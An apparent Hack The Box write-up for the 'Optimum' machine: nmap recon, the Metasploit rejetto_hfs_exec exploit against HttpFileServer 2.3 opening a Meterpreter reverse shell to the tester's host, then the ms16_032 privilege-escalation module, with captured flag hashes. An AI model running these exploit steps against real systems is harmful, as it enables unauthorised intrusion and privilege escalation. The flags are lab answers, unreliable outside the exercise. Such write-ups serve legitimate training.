@@ -1,0 +1,231 @@
+---
+layout: /src/layouts/PostLayout.astro
+title: Optimum
+tags: []
+---
+**Start 20:50 13/08**
+
+---
+```
+10.10.10.8
+```
+## Recon
+
+==Nmap==
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.10.8                                   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:53 IST
+Nmap scan report for 10.10.10.8
+Host is up (0.085s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -sT 10.10.10.8
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:53 IST
+Nmap scan report for 10.10.10.8
+Host is up (0.085s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
+```
+
+We found that `HttpFileServer 2.3` is vulnerable and that there is a `metasploit` module for it.
+
+## Metasploit
+
+Simply `search` for the module as follows:
+
+```bash
+msf6 > search HttpFileServer 2.3
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+```
+
+Afterwards we can `show options` and configure the `RHOSTS` and `LHOST`, then `run` the exploit.
+
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
+RHOSTS => 10.10.10.8
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.24
+LHOST => 10.10.14.24
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.24:4444 
+[*] Using URL: http://10.10.14.24:8080/XnYaQ5x
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /XnYaQ5x
+[*] Sending stage (176198 bytes) to 10.10.10.8
+[!] Tried to delete %TEMP%\jbpsNfCvnjv.vbs, unknown result
+[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.8:50065) at 2024-08-13 19:56:39 +0100
+[*] Server stopped.
+
+meterpreter > shell
+Process 1196 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>
+```
+
+## Flags
+
+==user.txt==
+User flag will be found in the same directory where the shell spawns.
+```powershell
+C:\Users\kostas\Desktop>type user.txt
+type user.txt
+d0c39409d7b994a9a1389ebf38ef5f73
+```
+
+==root.txt==
+Before moving on we need to `systeminfo` to enumerate the machine.
+```powershell
+C:\Users\kostas\Desktop>systeminfo
+systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ��
+System Boot Time:          9/8/2024, 10:02:16 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.411 MB
+Virtual Memory: Max Size:  4.799 MB
+Virtual Memory: Available: 4.092 MB
+Virtual Memory: In Use:    707 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              \\OPTIMUM
+Hotfix(s):                 31 Hotfix(s) Installed.
+                           [01]: KB2959936
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2920189
+                           [05]: KB2928120
+                           [06]: KB2931358
+                           [07]: KB2931366
+                           [08]: KB2933826
+                           [09]: KB2938772
+                           [10]: KB2949621
+                           [11]: KB2954879
+                           [12]: KB2958262
+                           [13]: KB2958263
+                           [14]: KB2961072
+                           [15]: KB2965500
+                           [16]: KB2966407
+                           [17]: KB2967917
+                           [18]: KB2971203
+                           [19]: KB2971850
+                           [20]: KB2973351
+                           [21]: KB2973448
+                           [22]: KB2975061
+                           [23]: KB2976627
+                           [24]: KB2977629
+                           [25]: KB2981580
+                           [26]: KB2987107
+                           [27]: KB2989647
+                           [28]: KB2998527
+                           [29]: KB3000850
+                           [30]: KB3003057
+                           [31]: KB3014442
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+We now need to `background` our current session, choose another module then run that module on our current session. 
+
+```powershell
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.24:4444 
+[+] Compressed size: 1160
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\PLHKKmfm.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3741
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 2104
+</SNIP>
+
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\PLHKKmfm.ps1
+
+meterpreter > shell
+Process 1508 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>
+```
+
+Then we yet again find the root flag in the Desktop directory.
+```powershell
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+51ed1b36553c8461f4552c2e92b3eeed
+```
+
+
+---
+
+**Finished 21:15 13/08**
+
+[^Links]: [[Hack The Box]] [[OSCP Prep]]
